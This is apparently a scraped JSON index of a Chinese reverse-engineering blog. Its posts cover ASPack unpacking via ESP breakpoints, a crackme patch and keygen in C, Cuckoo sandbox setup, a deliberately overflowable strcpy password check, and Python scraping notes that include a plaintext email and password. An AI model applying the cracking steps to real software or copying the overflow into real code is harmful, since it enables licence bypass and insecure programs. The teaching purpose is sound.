呵呵~是不是除了EIP不同以外，eax保存当前OEP值，其他都一模一样啊！ 为什么会这样呢？我们来看看 0040D000 A&gt; 60 pushad &#x2F;&#x2F;注意这里ESP&#x3D;0012FFC4 0040D001 E8 00000000 call ASPACK.0040D006 &#x2F;&#x2F;ESP&#x3D;0012FFA4 PUSHAD就是把所有寄存器压栈！我们在到壳的最后看看： 代码: 0040D558 61 popad &#x2F;&#x2F;ESP&#x3D;0012FFA4 0040D559 75 08 jnz short ASPACK.0040D563 &#x2F;&#x2F;注意这里ESP&#x3D;0012FFC4 也就是说当我们对ESP的0012FFA4下硬件访问断点之后。当程序要通过堆栈访问这些值，从而恢复原来寄存器的值，准备跳向苦苦寻觅的OEP的时候，OD帮助我们中断下来。 小结：我们可以把壳假设为一个子程序，当壳把代码解压前和解压后，他必须要做的是遵循堆栈平衡的原理。 因为大家对ESP理解各有异同，但是，大同小异！一般理解可以为： 1、在命令行下断hr esp-4（此时的ESP就是OD载入后当前显示的值） 2、hr ESP(关键标志下一行代码所指示的ESP值(单步通过))","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"第一次注册机","slug":"逆向/第一次编写注册机","date":"2017-07-11T16:00:00.000Z","updated":"2024-03-12T09:44:45.414Z","comments":true,"path":"2017/07/12/逆向/第一次编写注册机/","link":"","permalink":"http://zwjsfdbb.top/2017/07/12/%E9%80%86%E5%90%91/%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%BC%96%E5%86%99%E6%B3%A8%E5%86%8C%E6%9C%BA/","excerpt":"步骤如下1、破解样本 链接为 http://pan.baidu.com/s/1miA38A8 2、首先打开样本程序，得到关键字符串“Incorrect!!,Try Again”，如下 3、打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串,得到关键字符串”Correct way to go,You Got It”.点击找到数据段的定义位置，按下Ctrl+x 找到它的引用位置，然后按下tab键，找到反编译的结果。 分析反编译的c程序，发现其首先进行字符串长度的比较，然后把字符串和一个常数进行了一系列的操作。 4、打开od,载入程序定位到关键字符串的位置（在IDA中有具体地址），直接ctrl+G输入地址可以直接定位字符串位置，然后向上查找关键跳转，找到一个JNZ。。。。，直接断点，看下结果。然后发现跳转实现的话，直接后面单步执行，会弹出“Incorrect!!,Try Again”。尝试把跳转给改了，然后保存到文件，此时再随意输入，发现弹出“correct way to go”、 5、下面分析其算法逻辑。JNZ 前面的call下断点，单步进入发现是一个字符串你的比较，一个字符串是我们输入的第二个字，另一个是一个长字符串，猜测应该是第一个字符串经过一系列运算所得。向上分析，查找算法：找到GetDlgItemTextA_3097，为获取输入的字符串，然后后面是字符串长度的比较。 再后面就是其具体的算法了：","text":"步骤如下1、破解样本 链接为 http://pan.baidu.com/s/1miA38A8 2、首先打开样本程序，得到关键字符串“Incorrect!!,Try Again”，如下 3、打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串,得到关键字符串”Correct way to go,You Got It”.点击找到数据段的定义位置，按下Ctrl+x 找到它的引用位置，然后按下tab键，找到反编译的结果。 分析反编译的c程序，发现其首先进行字符串长度的比较，然后把字符串和一个常数进行了一系列的操作。 4、打开od,载入程序定位到关键字符串的位置（在IDA中有具体地址），直接ctrl+G输入地址可以直接定位字符串位置，然后向上查找关键跳转，找到一个JNZ。。。。，直接断点，看下结果。然后发现跳转实现的话，直接后面单步执行，会弹出“Incorrect!!,Try Again”。尝试把跳转给改了，然后保存到文件，此时再随意输入，发现弹出“correct way to go”、 5、下面分析其算法逻辑。JNZ 前面的call下断点，单步进入发现是一个字符串你的比较，一个字符串是我们输入的第二个字，另一个是一个长字符串，猜测应该是第一个字符串经过一系列运算所得。向上分析，查找算法：找到GetDlgItemTextA_3097，为获取输入的字符串，然后后面是字符串长度的比较。 再后面就是其具体的算法了： 用c代码来表示就是： #include&lt;stdio.h&gt; #include&lt;string.h&gt; int main() &#123; char name[200]; char key[100] = &#123; 0 &#125;; int nlen,i; // int 4个字节 int start; //int len=5; start=0x81276345; scanf(&quot;%s&quot;, name); nlen = strlen(name); if(nlen&gt;=5) &#123; //printf(&quot;%s&quot;, name); //printf(&quot;%c&quot;, name[0]); for(i=0;i&lt;nlen;i++) &#123; start=start+name[i]; //i=i&lt;&lt;8; //printf(&quot;%x\\n&quot;,i); start=start^(i&lt;&lt;8); //j=i+1; //tmp=len*i; //tmp=~tmp; //j=j*tmp; start=start*(i+1)*(~(nlen*i)); //printf(&quot;%x\\n&quot;,start); &#125; printf(&quot;%1u\\n&quot;,start); //u 代表无符号整数 system(&quot;pause&quot;); &#125; else &#123; printf(&quot;序列号不能少于5位\\n&quot;); system(&quot;pause&quot;); &#125; return 0; &#125; 输入任意大于等于5位的字符串，得到的结果就是其序列号。如","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"cuckoo真机分析环境(clonezilla)","slug":"逆向/cuckoo真机分析环境","date":"2017-07-10T16:00:00.000Z","updated":"2024-03-12T13:04:59.981Z","comments":true,"path":"2017/07/11/逆向/cuckoo真机分析环境/","link":"","permalink":"http://zwjsfdbb.top/2017/07/11/%E9%80%86%E5%90%91/cuckoo%E7%9C%9F%E6%9C%BA%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/","excerpt":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。 一、硬件准备*ubuntu16.04服务器一台(可在虚拟机中实现） *win7或者winxp一台 *交换机一台 二 .服务器搭建我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。 1）.安装python2.7 这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。 2）.安装依赖库 1.安装相关的依赖库 sudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev","text":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。 一、硬件准备*ubuntu16.04服务器一台(可在虚拟机中实现） *win7或者winxp一台 *交换机一台 二 .服务器搭建我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。 1）.安装python2.7 这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。 2）.安装依赖库 1.安装相关的依赖库 sudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev 然后去cuckoog官网或者github下载cuckoo最新版本,然后解压打开cuckoo文件夹，有个requiremens.txt的文件夹，这需要全部下载，可以用python的pip进行安装，其中其中的 pefile 需要从 Google Code 上下载，由于大陆网络限制，需要自备梯子，登上梯子后执行以下批量安装命令： pip install -r requirements.txt 或者先把pefile安装源码下载，手动安装，然后把它从requirements.txt里删除，然后用pip命令安装，个人建议用第二种方法。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2.Host 机需要可以嗅探网络数据包，需要安装 tcpdump ，如果本机没有，则执行以下命令安装 tcpdump： **apt-get install tcpdump** 如果系统没启用 root 账户，由于 tcpdump 的执行需要 root 权限，则需要以下配置： **$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump** 如果系统里没有setcap命令，则需要安装 libpcap包： **$ sudo apt-get install libcap2-bin** 如果需要启用内存镜像分析，需要安装 volatility： **apt-get install volatility** 3）.cuckoo配置文件的修改 主要修改的文件有：cuckoo.conf,physical.conf,auliary.conf.重点修改前两个。 1.修改cuckoo.conf version_check = on 这个其实可以关掉，不然一直检查，如果你版本稍微低了一下就报错。 machinery = physical 这个地方改成physical ip = 192.168.56.1 根据你的实际情况填写 vm_state = 60 根据你的电脑实际还原时间填写 ;2.修改physical.conf user &#x3D; username password &#x3D; password 根据你的分析机填写 interface &#x3D; eth0根据你的网卡填写 ip &#x3D; 192.168.56.101根据你的分析机填写 4）.安装drbl 设置静态ip地址，直接在桌面设置及可以了。 2.安装drbl金钥 wget -q http://drbl.nchc.org.tw/GPG-KEY-DRBL -O- | sudo apt-key add - 3.添加drbl源(根据自己的系统版本修改一下） vi /etc/apt/sources.list deb http://free.nchc.org.tw/ubuntu xenial main restricted universe multiverse deb http://free.nchc.org.tw/drbl-core drbl stable 3.安装drbl sudo apt-get update sudo apt-get install drbl 4.设置drblserver sudo drblsrv -i 提示!当有yes&#x2F;no选项的时候，预设的值是大写的字母。例如 (y&#x2F;N), 预设值是 “N”, 当你按 “Enter”的时候，程式使用的值就是 “N”。如果你不确认选用那个好的时候，直接按”Enter”键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，在这不赘述。 5.设置环境 sudo drblpush -i 提示!当有yes&#x2F;no选项的时候，预设的值是大写的字母。例如 (y&#x2F;N), 预设值是 “N”, 当你按 “Enter”的时候，程式使用的值就是 “N”。如果你不确认选用那个好的时候，直接按”Enter”键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，一般都差不多。注意有一点，搜集网卡的时候尽量选择实时收集，然后收集完，注意查看是否有文件在相应目录，还有注意系统读取网卡文件的名字的命名方式，比如我的网卡为ens33,所以网卡文件为macadr-ens33.txt,但是系统读取文件的时候可能会去查找以macadr-eth开头的文件，所以遇到这种情况的话，去手动创建一个这样的文件就可以了。还有就是配置的时候尽量切到&#x2F;etc&#x2F;drbl目录下进行操作。 6.现在基本上drbl就设置好了。 5）、网路设置 由于我在虚拟机上搭建的服务器，所以我选择桥接模式，桥接到物理机有线网卡上，然后外接到交换机，然后分析机器也接到交换机，构成一个物理的局域网环境。 三.分析机设置1.首先安装python2.7，去python官网下载就好了。 2.关闭防火墙，自动更新，uac。 3.设置python运行权限为管理员。 4.设置固定ip.(注意此时的ip不要和clonezila给他分配的ip一致，否则在还原的时候，网络捕捉模块会抓取太多还原时候的无用包，从而导致分析报告异常庞大。） **到此整个环境搭建就已经差不多了。注意需要熟悉drbl的使用方法才能使用此环境。此外还需要把drbl还原分析机的指令加入到cuckoo的源代码里去。文件具体为：scheduler库文件，添加到让分析机关机指令的前面位置。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"栈基础知识","slug":"逆向/栈基础知识","date":"2017-07-09T16:00:00.000Z","updated":"2024-03-12T09:46:54.971Z","comments":true,"path":"2017/07/10/逆向/栈基础知识/","link":"","permalink":"http://zwjsfdbb.top/2017/07/10/%E9%80%86%E5%90%91/%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"1.C语言变量的分布 ：C 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： #include &lt;stdio.h&gt; int g1=0, g2=0, g3=0; int main() &#123; static int s1=0, s2=0, s3=0; int v1=0, v2=0, v3=0; //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v1); //打印各本地变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v2); printf(&quot;0x%08x\\n\\n&quot;,&amp;v3); printf(&quot;0x%08x\\n&quot;,&amp;g1); //打印各全局变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;g2); printf(&quot;0x%08x\\n\\n&quot;,&amp;g3); printf(&quot;0x%08x\\n&quot;,&amp;s1); //打印各静态变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;s2); printf(&quot;0x%08x\\n\\n&quot;,&amp;s3); system(&quot;pause&quot;); return 0; &#125; 可以看出本地变量和全局&#x2F;静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“， 2. 栈的存储 #include &lt;stdio.h&gt; void __stdcall func(int param1,int param2,int param3) &#123; int var1=param1; int var2=param2; int var3=param3; printf(&quot;0x%08x\\n&quot;,&amp;parameter1); //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;parameter2); printf(&quot;0x%08x\\n\\n&quot;,&amp;parameter3); printf(&quot;0x%08x\\n&quot;,&amp;var1); printf(&quot;0x%08x\\n&quot;,&amp;var2); printf(&quot;0x%08x\\n\\n&quot;,&amp;var3); return; &#125; int main() &#123; func(1,2,3); return 0; &#125; 函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3 3.程序进入main()函数 ，栈帧的保存和关闭例如：","text":"1.C语言变量的分布 ：C 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： #include &lt;stdio.h&gt; int g1=0, g2=0, g3=0; int main() &#123; static int s1=0, s2=0, s3=0; int v1=0, v2=0, v3=0; //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v1); //打印各本地变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v2); printf(&quot;0x%08x\\n\\n&quot;,&amp;v3); printf(&quot;0x%08x\\n&quot;,&amp;g1); //打印各全局变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;g2); printf(&quot;0x%08x\\n\\n&quot;,&amp;g3); printf(&quot;0x%08x\\n&quot;,&amp;s1); //打印各静态变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;s2); printf(&quot;0x%08x\\n\\n&quot;,&amp;s3); system(&quot;pause&quot;); return 0; &#125; 可以看出本地变量和全局&#x2F;静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“， 2. 栈的存储 #include &lt;stdio.h&gt; void __stdcall func(int param1,int param2,int param3) &#123; int var1=param1; int var2=param2; int var3=param3; printf(&quot;0x%08x\\n&quot;,&amp;parameter1); //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;parameter2); printf(&quot;0x%08x\\n\\n&quot;,&amp;parameter3); printf(&quot;0x%08x\\n&quot;,&amp;var1); printf(&quot;0x%08x\\n&quot;,&amp;var2); printf(&quot;0x%08x\\n\\n&quot;,&amp;var3); return; &#125; int main() &#123; func(1,2,3); return 0; &#125; 函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3 3.程序进入main()函数 ，栈帧的保存和关闭例如： int main（） &#123; return0； &#125; 汇编代码为： push ebp; 保存进入main()函数时其他初始化函数的栈底 move ebp,esp; 把当前esp的值作为栈底 sub esp ,40h 开辟栈空间，作为局部变量的存储空间 push ebx push esi push edi 保存寄存器的值 LEA edi ,[ebp-40h] 取出此函数可用栈空间首地址 mov ecx,10h 设置ecx寄存器的值 mov eax ,occcccccch 把局部变量初始化为0xcccccccch rep stos dword ptr [edi] 根据ecx的值，把eax的内容，以四字节为单位写到edi指向的内存 xor eax,eax 设置返回值为0 pop edi pop esi pop ebx 弹出压入寄存器的值 add esp,40h 降低esp,局部空间释放 cmp ebp,esp 检查栈平衡 call _chkesp() 进入栈错误检查函数 mov esp.ebp 还原esp pop ebp 还原ebp ret 4. 简单的分配栈帧及溢出修改相邻变量例如： #include &lt;windows.h&gt; #define PASSWORD &quot;1234567&quot; int verify_password(char *password)&#123; int authenticated; char buffer[8]; authenticated = strcmp(password,PASSWORD); strcpy(buffer,password); return authenticated; &#125; int main(int argc, char* argv[]) &#123; int valid_flag = 0; char password[1024]; FILE *fp; if (!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))&#123; return 0; &#125; fscanf(fp,&quot;%s&quot;,password); valid_flag = verify_password(password); if(valid_flag)&#123; printf(&quot;incorrect password!\\n&quot;); &#125;else&#123; printf(&quot;Congratulation! You have passed the verification !\\n&quot;); &#125; Sleep(-1); return 1; &#125; 用OD调试：进入main()主函数，找到验证密码的函数调用位置，进入到函数具体代码处： 前面部分就是栈分配局部变量空间和初始化的过程，然后就是字符串的计较，最后是字符串的复制，分析可得栈溢出在这一部分，在指令008D1409处把函数的返回值（EAX储存的是返回值）存在了EBP-0XC处，下面就是strocpy的操作，char buffer[8]分配了八个字节的存储空间，但是password.txt的密码如图为24个字节，知错执行strcpy的时候，把buffer 附近的变量空间也给覆盖了，比如返回值的。以上过程如图所示","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"win10添加右键菜单","slug":"杂学/右键菜单","date":"2017-07-05T16:00:00.000Z","updated":"2024-03-12T10:06:27.342Z","comments":true,"path":"2017/07/06/杂学/右键菜单/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E6%9D%82%E5%AD%A6/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/","excerpt":"1.win +R 打开运行窗口，输入regedit，进入注册表。 2.打开HKEY_CLASSES_ROOT*\\shell，右键新建项，输入项名，比如sublime，点击默认输入数值数据为你的程序名比如sublime。 3.点击新建项sublime,右键新建项，命名为command,必须为这个名字，然后点击默认，在数值数据那里输入你要添加的程序路径，比如我的sublime 为”E:\\Sublime Text 3\\sublime_text.exe” “%1”确定即可。 后续：邮件发送到菜单 1.运行 shell:sendto 2.新建你要添加到发送到的程序快捷方式即可","text":"1.win +R 打开运行窗口，输入regedit，进入注册表。 2.打开HKEY_CLASSES_ROOT*\\shell，右键新建项，输入项名，比如sublime，点击默认输入数值数据为你的程序名比如sublime。 3.点击新建项sublime,右键新建项，命名为command,必须为这个名字，然后点击默认，在数值数据那里输入你要添加的程序路径，比如我的sublime 为”E:\\Sublime Text 3\\sublime_text.exe” “%1”确定即可。 后续：邮件发送到菜单 1.运行 shell:sendto 2.新建你要添加到发送到的程序快捷方式即可","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"简单爬虫","slug":"编程/spider","date":"2017-07-05T16:00:00.000Z","updated":"2024-03-12T11:13:10.711Z","comments":true,"path":"2017/07/06/编程/spider/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E7%BC%96%E7%A8%8B/spider/","excerpt":"-- coding: utf-8 -- #可解决诸多编码问题，建议程序加上 # import urllib2 # import urllib 1 .直接传输数据。利用urllib2# response =urllib2.urlopen(&#39;http://www.baidu.com&#39;) # print response.read() #首先建立一个request实例，可以在构建请求的时候加入其他内容，比如data和header #request=urllib2.request(url) #response=urllib2.urlopen(request) #print response.read() 2.post方式传递数据和get方式# post方式传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # request=urllib2.request(&#39;http://www.baidu.com&#39;,data) # response=urllib2.urlopen(request) # print response.read() #get方式出传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # url=&quot;http://www.baidu.com&quot;+&quot;?&quot;+data # request=urllib2.request(url) # response=urllib2.urlopen(request) # print response.read() 3 .模拟登陆# 构建request实例的时候，加入header模拟登陆 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&#39;,&#39;Referer&#39;:&#39;https://www.baidu.com/link?url=E3phPx1eObXAfu4bCGSc2YVs58W76-YCXkEtiAN51lC&amp;wd=&amp;eqid=8815b85d0006fca2000000035915d702&#39;&#125; # request=urllib2.request(&#39;http://www.baidu.com&#39;,data,headers) # response=urllib2.urlopen(request) # print response.read() 4.设置代理服务器# 设置代理服务器解决ip频繁访问被封问题 # import urllib2 # enable_proxy=True # proxy_handler=urllib2.ProxyHander(&#123;&quot;http&quot;:&#39;http://some-proxy.com:8080&#39;&#125;) # null_proxy_handler=urllib2.build_opener(proxy_handler) # if enable_proxy: # opener=urllib2.build_opener(proxy_handler) # else: # opener=urllib2.build_opener(null_proxy_handler) #urllib2.install_opener(opener) #","text":"-- coding: utf-8 -- #可解决诸多编码问题，建议程序加上 # import urllib2 # import urllib 1 .直接传输数据。利用urllib2# response =urllib2.urlopen(&#39;http://www.baidu.com&#39;) # print response.read() #首先建立一个request实例，可以在构建请求的时候加入其他内容，比如data和header #request=urllib2.request(url) #response=urllib2.urlopen(request) #print response.read() 2.post方式传递数据和get方式# post方式传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # request=urllib2.request(&#39;http://www.baidu.com&#39;,data) # response=urllib2.urlopen(request) # print response.read() #get方式出传送数据 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # url=&quot;http://www.baidu.com&quot;+&quot;?&quot;+data # request=urllib2.request(url) # response=urllib2.urlopen(request) # print response.read() 3 .模拟登陆# 构建request实例的时候，加入header模拟登陆 # values=&#123;&#39;username&#39;:&#39;1265616844@qq.com&#39;,&#39;password&#39;:&#39;scu123456&#39;&#125; # data=urllib.urlencode(values) # headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&#39;,&#39;Referer&#39;:&#39;https://www.baidu.com/link?url=E3phPx1eObXAfu4bCGSc2YVs58W76-YCXkEtiAN51lC&amp;wd=&amp;eqid=8815b85d0006fca2000000035915d702&#39;&#125; # request=urllib2.request(&#39;http://www.baidu.com&#39;,data,headers) # response=urllib2.urlopen(request) # print response.read() 4.设置代理服务器# 设置代理服务器解决ip频繁访问被封问题 # import urllib2 # enable_proxy=True # proxy_handler=urllib2.ProxyHander(&#123;&quot;http&quot;:&#39;http://some-proxy.com:8080&#39;&#125;) # null_proxy_handler=urllib2.build_opener(proxy_handler) # if enable_proxy: # opener=urllib2.build_opener(proxy_handler) # else: # opener=urllib2.build_opener(null_proxy_handler) #urllib2.install_opener(opener) # 5.捕获url异常的写法# # import urllib2 # request = urllib2.Request(&#39;http://www.baidu&#39;) # try: # print urllib2.urlopen(request).read() # except urllib2.URLError, e: # print e.reason # 6.捕获httperror 的写法# import urllib2 # req=urllib2.Request(&quot;http://blog.csdn.net/cqcre&quot;) # try: # print urllib2.urlopen(req) # except urllib2.HTTPError,e: # print e.code # print e.reason # except urllib2.URLError,e: # print e.reason #requires 库的使用 # import requests # s = requests.session() # s.headers.update(&#123;&#39;x-test&#39;: &#39;true&#39;&#125;) # r = s.get(&#39;http://httpbin.org/headers&#39;, headers=&#123;&#39;x-test2&#39;: &#39;true&#39;&#125;) # print r.text 7.正则匹配Example 1 # import re # a=&#39;ba91c&#39; # pattern=re.compile(r&quot;a\\d&#123;1,2&#125;c&quot;) # if re.match(pattern,a): #开头必须匹配 # print &#39;success&#39; # if re.search(pattern,a): #开头不要求匹配 # print &#39;research success &#39; # pattern=re.compile(r&quot;\\d+&quot;) # print re.split(pattern,a) # print re.findall(pattern,a) Example 2 # import urllib # import json # import urllib2 # import re # from bs4 import BeautifulSoup # page=1 # url = &#39;http://www.qiushibaike.com/hot/page/&#39; + str(page) # headers=&#123;&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#39;&#125; # try: # req=urllib2.Request(url,headers=headers) # response=urllib2.urlopen(req) # print response.code # content=response.read().decode(&#39;utf-8&#39;) # pattern = re.compile(r&#39;&lt;a href=.*? target=.*? title=.*?&gt;.*?&lt;h2&gt;(.*?)&lt;/h2&gt;.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;i class=&quot;number&quot;&gt;(.*?)&lt;/i&gt;&#39;, re.S) # items=re.findall(pattern,content) # for item in items: # print json.dumps(item[0], encoding=&quot;UTF-8&quot;, ensure_ascii=False),json.dumps(item[1], encoding=&quot;UTF-8&quot;, ensure_ascii=False),json.dumps(item[2], encoding=&quot;UTF-8&quot;, ensure_ascii=False) # except urllib2.URLError,e: # if hasattr(e,&quot;code&quot;): # print e.code # if hasattr(e,&quot;reason&quot;): # print e.reason 8.时间戳# from datetime import datetime # import time # a =datetime.now() # #sleep(10) # time.sleep(10) # b=datetime.now() # print (b-a).seconds 9.beautifulsoup 的学习# from bs4 import BeautifulSoup # html = &quot;&quot;&quot; # &lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt; # &lt;body&gt; # &lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt; # &lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were # &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;, # &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and # &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;; # and they lived at the bottom of a well.&lt;/p&gt; # &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt; # &quot;&quot;&quot; # soup=BeautifulSoup(html,&#39;lxml&#39;) # for p in soup.p.next_siblings : #同级兄弟节点 # print p # print soup.prettify() # print soup.title # print soup.title.string # for string in soup.body.stripped_strings: # print string # print soup.a # print soup.a.string # print soup.head.contents # for children in soup.head.children: # print children #soup.findall() #还可以传入关键词如果一个指定名字的参数不是搜索内置的参数名, #搜索时会把该参数当作指定名字tag的属性来搜索,例如如果包含一 #个名字为 id 的参数,Beautiful Soup会搜索每个tag的”id”属性 #for examle soup.findall(id=&quot;link2&quot;) or soup.findall(href=re.compile(&#39;elsie&#39;) #print soup.find_all(attrs=&#123;&quot;name&quot;: &quot;dromouse&quot;&#125;) #soup.select() # print soup.select(&#39;title&#39;) #通过标签名 # print soup.select(&#39;.story&#39;) #通过类名 # print soup.select(&quot;#link1&quot;) #通过id # print soup.select(&quot;p #link1&quot;) #标签名和id 的组合 # print soup.select(&#39;a[class=&quot;sister&quot;]&#39;)#标签和类 10.selenium测试# -*- coding: utf-8 -*- # from selenium import webdriver # browser=webdriver.Chrome() # browser.get(&#39;http://www.baidu.com/&#39;) # import sys # reload(sys) # sys.setdefaultencoding(&#39;utf-8&#39;) # from selenium import webdriver # from selenium.webdriver.common.keys import Keys # # driver = webdriver.Chrome() # driver.get(&quot;http://www.python.org&quot;) # assert &quot;Python&quot; in driver.title # elem = driver.find_element_by_name(&quot;q&quot;) # elem.send_keys(&quot;pycon&quot;) # elem.send_keys(Keys.RETURN) # print driver.page_source 11. selenium 优化以登陆腾讯哈勃分析系统为例 主要的优化在于把time.sleep()这种强制等待多少秒换成隐式等待和显式等待。所谓隐式等待就是driver.implicitly_wait(30) 设置最大超时时间为30秒，当页面加载完毕以后，要查找的元素找到即进行下一步，而不必强行等待多少秒，所谓的显式等待就是等你所要查找的元素出现后进行下一步，WebDriverWait(driver, 60).until(EC.presence_of_element_located(locator)) 。 # -*- coding: utf-8 -*- # 登陆腾讯哈勃分析系统 import time import json from selenium import webdriver from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By driver = webdriver.Chrome() time.sleep(3) driver.get(&#39;https://habo.qq.com/&#39;) #time.sleep(3) driver.implicitly_wait(30) #driver.implicitly_wait(30) driver.find_element_by_id(&quot;nologin&quot;).click() # time.sleep(5) #driver.implicitly_wait(30) driver.switch_to_frame(&#39;login_ifr&#39;) # print driver.page_source.encode(&#39;utf-8&#39;) driver.find_element_by_css_selector(&quot;#img_out_1031652154&quot;).click() # time.sleep(3) #driver.implicitly_wait(30) for i in range(1200,1300): filename=&#39;F:\\\\sample_malware\\\\1\\\\pdf\\\\&#39;+str(i)+&#39;.pdf&#39; driver.find_element_by_css_selector(&quot;#file_upload2&quot;).send_keys(filename) #time.sleep(15) #driver.implicitly_wait(30) time.sleep(3) print &#39;pdf&#39;+str(i) # try: # driver.find_element_by_id(&#39;file_upload_fail&#39;) # a = True # except: # a = False # if a 